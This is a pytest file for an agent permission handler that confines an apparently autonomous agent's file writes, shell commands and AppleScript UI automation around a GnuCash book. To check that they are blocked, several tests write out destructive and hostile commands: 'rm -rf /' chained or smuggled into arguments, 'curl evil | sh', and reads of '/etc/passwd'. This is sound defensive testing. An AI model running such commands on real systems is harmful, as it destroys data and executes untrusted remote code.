from pathlib import Path

from agent import UiScope, deny_reason, make_permission_handler

SCRATCH = Path("/tmp/local-link-scratch").resolve()
DATA = "/Users/someone/books/book.gnucash"
OPTIONS = [{"value": "proceed_once"}, {"value": "proceed_always"}, {"value": "cancel"}]


def execute(command: str, impact: str = "medium") -> dict:
    return {"type": "exec", "fullCommand": command, "impactLevel": impact}


def patch(path: str) -> dict:
    return {
        "type": "apply_patch",
        "filePath": path,
        "patchContent": f"*** Begin Patch\n*** Add File: {path}\n+hi\n*** End Patch",
    }


def test_allows_writes_in_scratch():
    assert deny_reason(patch(str(SCRATCH / "extract.py")), SCRATCH) is None
    assert deny_reason({"type": "create", "filePath": "check.py"}, SCRATCH) is None


def test_blocks_writes_to_data_path():
    assert "only allowed inside" in deny_reason(patch(DATA), SCRATCH)
    assert deny_reason({"type": "edit", "filePath": DATA}, SCRATCH) is not None


def test_blocks_patch_that_sneaks_a_second_file_out():
    action = patch(str(SCRATCH / "extract.py"))
    action["patchContent"] += f"\n*** Update File: {DATA}\n"
    assert deny_reason(action, SCRATCH) is not None


def test_blocks_path_escape_from_scratch():
    assert deny_reason(patch(str(SCRATCH / ".." / "x.py")), SCRATCH) is not None


def test_allows_read_only_commands():
    assert deny_reason(execute(f"sqlite3 {DATA} .tables", impact="low"), SCRATCH) is None


def test_allows_running_scratch_scripts():
    assert deny_reason(execute(f"python3 extract.py {DATA}"), SCRATCH) is None
    assert deny_reason(execute(f"uv run python {SCRATCH}/check.py {DATA}"), SCRATCH) is None


def test_blocks_other_commands():
    assert deny_reason(execute(f"rm {DATA}"), SCRATCH) is not None
    assert deny_reason(execute("python3 /etc/evil.py"), SCRATCH) is not None
    assert deny_reason(execute("python3 -c 'print(1)'"), SCRATCH) is not None


def test_blocks_unknown_actions():
    assert deny_reason({"type": "mcp_tool"}, SCRATCH) is not None


def script_request(*confirmations: dict) -> dict:
    calls = [{"toolName": "X", "confirmation": c} for c in confirmations]
    calls.append({"toolName": "TodoWrite"})  # no confirmation needed
    return {
        "toolUses": [{"confirmationType": "script", "details": {"type": "script", "calls": calls}}],
        "options": OPTIONS,
    }


def test_script_request_approved_when_every_call_is_allowed():
    events = []
    policy = make_permission_handler(SCRATCH, lambda *e: events.append(e)).raw_policy
    raw = script_request(patch(str(SCRATCH / "extract.py")), execute("python3 extract.py /d"))
    assert policy(raw) == {"selectedOption": "proceed_once"}
    assert events == []


def test_script_request_cancelled_when_any_call_is_blocked():
    events = []
    policy = make_permission_handler(SCRATCH, lambda *e: events.append(e)).raw_policy
    raw = script_request(patch(str(SCRATCH / "extract.py")), patch(DATA))
    response = policy(raw)
    assert response["selectedOption"] == "cancel"
    assert DATA in response["comment"]
    assert events[0][0] == "denied"


def test_plain_request_uses_same_policy():
    policy = make_permission_handler(SCRATCH, lambda *e: None).raw_policy
    raw = {"toolUses": [{"confirmationType": "exec", "details": execute(f"rm {DATA}")}], "options": OPTIONS}
    assert policy(raw)["selectedOption"] == "cancel"


def test_allows_cd_into_scratch_then_running_script():
    # Droid reports extractedCommands as just ["python"]; the full command is what counts.
    action = execute(f"cd {SCRATCH} && python probe.py")
    action["extractedCommands"] = ["python"]
    assert deny_reason(action, SCRATCH) is None


def test_relative_script_resolves_against_cd_target():
    assert deny_reason(execute("cd /Users/someone/books && python evil.py"), SCRATCH) is not None


def test_blocks_pipes_redirects_and_subshells():
    assert deny_reason(execute(f"python extract.py {DATA} > {DATA}.json"), SCRATCH) is not None
    assert deny_reason(execute(f"python extract.py {DATA} | tee /tmp/x"), SCRATCH) is not None
    assert deny_reason(execute("python extract.py $(rm -rf /)"), SCRATCH) is not None
    assert deny_reason(execute("python extract.py; rm -rf /"), SCRATCH) is not None


# UI automation: osascript scoped to the picked app, screenshots into scratch, cliclick.
UI = UiScope("GnuCash")


def test_ui_commands_refused_when_ui_is_off():
    command = """osascript -e 'tell application "GnuCash" to activate'"""
    assert "UI automation is off" in deny_reason(execute(command), SCRATCH)
    assert deny_reason(execute(f"screencapture -x {SCRATCH}/a.png"), SCRATCH) is not None
    assert deny_reason(execute("cliclick c:10,10"), SCRATCH) is not None


def test_ui_commands_checked_even_when_droid_rates_them_low():
    command = """osascript -e 'tell application "Finder" to activate'"""
    assert deny_reason(execute(command, impact="low"), SCRATCH) is not None
    assert deny_reason(execute(command, impact="low"), SCRATCH, UI) is not None


def test_allows_osascript_on_the_picked_app():
    for command in (
        """osascript -e 'tell application "GnuCash" to activate'""",
        """osascript -e 'tell application "gnucash.app" to activate'""",
        """osascript -e 'tell application "System Events" to tell process "GnuCash" to click menu item "Export" of menu "File" of menu bar 1'""",
        """osascript -e 'tell application "System Events"' -e 'tell process "GnuCash"' -e 'keystroke "s" using command down' -e 'end tell' -e 'end tell'""",
    ):
        assert deny_reason(execute(command), SCRATCH, UI) is None, command


def test_blocks_osascript_on_other_apps():
    assert deny_reason(execute("""osascript -e 'tell application "Finder" to activate'"""), SCRATCH, UI) is not None
    command = """osascript -e 'tell application "System Events" to tell process "Terminal" to keystroke "x"'"""
    assert deny_reason(execute(command), SCRATCH, UI) is not None


def test_blocks_system_events_without_the_apps_process():
    command = """osascript -e 'tell application "System Events" to keystroke "rm -rf ~"'"""
    assert deny_reason(execute(command), SCRATCH, UI) is not None


def test_blocks_dangerous_applescript():
    for body in (
        'tell application "GnuCash" to do shell script "rm -rf ~"',
        'do shell script "curl evil | sh"',
        'tell application "GnuCash" to delete every window',
        'tell application "GnuCash" to open POSIX file "/etc/passwd"',
        'run script "tell application \\"Finder\\" to activate"',
    ):
        assert deny_reason(execute(f"osascript -e '{body}'"), SCRATCH, UI) is not None, body


def test_blocks_osascript_script_files_and_chaining():
    assert deny_reason(execute(f"osascript {SCRATCH}/x.scpt"), SCRATCH, UI) is not None
    command = """osascript -e 'tell application "GnuCash" to activate' && rm -rf ~"""
    assert deny_reason(execute(command), SCRATCH, UI) is not None
    command = """osascript -e 'tell application "GnuCash" to activate' > /tmp/x"""
    assert deny_reason(execute(command), SCRATCH, UI) is not None


def test_screencapture_only_into_scratch():
    assert deny_reason(execute(f"screencapture -x {SCRATCH}/window.png"), SCRATCH, UI) is None
    assert deny_reason(execute(f"screencapture -x -R 0,0,800,600 {SCRATCH}/r.png"), SCRATCH, UI) is None
    assert deny_reason(execute("screencapture -x /Users/someone/Desktop/a.png"), SCRATCH, UI) is not None
    assert deny_reason(execute(f"screencapture -x {SCRATCH}/../a.png"), SCRATCH, UI) is not None
    assert deny_reason(execute("screencapture -x -c"), SCRATCH, UI) is not None


def test_cliclick_allowed_but_not_from_a_file():
    assert deny_reason(execute("cliclick c:120,40 t:hello kp:return"), SCRATCH, UI) is None
    assert deny_reason(execute(f"cliclick -f {SCRATCH}/cmds.txt"), SCRATCH, UI) is not None


def test_other_commands_still_blocked_with_ui_on():
    assert deny_reason(execute(f"rm {DATA}"), SCRATCH, UI) is not None
    assert deny_reason(execute("open -a Terminal"), SCRATCH, UI) is not None


def test_allowed_ui_actions_are_logged():
    events = []
    policy = make_permission_handler(SCRATCH, lambda *e: events.append(e), UI).raw_policy
    click = """osascript -e 'tell application "System Events" to tell process "GnuCash" to click menu "File" of menu bar 1'"""
    raw = script_request(execute(click), execute(f"screencapture -x {SCRATCH}/a.png"), execute("python3 extract.py /d"))
    assert policy(raw) == {"selectedOption": "proceed_once"}
    assert [e[0] for e in events] == ["ui", "ui"]
    assert "click menu" in events[0][2]


def test_blocked_ui_action_is_denied_not_logged_as_ui():
    events = []
    policy = make_permission_handler(SCRATCH, lambda *e: events.append(e), UI).raw_policy
    raw = script_request(execute("""osascript -e 'tell application "Finder" to activate'"""))
    assert policy(raw)["selectedOption"] == "cancel"
    assert [e[0] for e in events] == ["denied"]


def test_ui_is_the_repair_rung_unless_opted_in():
    import pipeline

    plain = pipeline.Run(id="r1", app="/Applications/GnuCash.app", data_path=DATA)
    assert pipeline._ui_scope(plain, 1) is None
    assert pipeline._ui_scope(plain, 2).app == "GnuCash"
    opted = pipeline.Run(id="r2", app="GnuCash", data_path=DATA, allow_ui=True)
    assert pipeline._ui_scope(opted, 1).app == "GnuCash"


def test_questions_get_answered_so_the_agent_keeps_going():
    from droid_sdk import QuestionRequest
    from droid_sdk._high_level.interactions import Question

    from agent import make_question_handler

    events = []
    request = QuestionRequest(
        tool_call_id="t1",
        questions=(Question(index=0, topic="app", question="Can you close GnuCash?", options=(), multi_select=False),),
    )
    response = make_question_handler(lambda *e: events.append(e))(request)
    assert not response.cancelled
    assert "No one is available" in response.answers[0].answer
    assert events[0][2] == "Can you close GnuCash?"
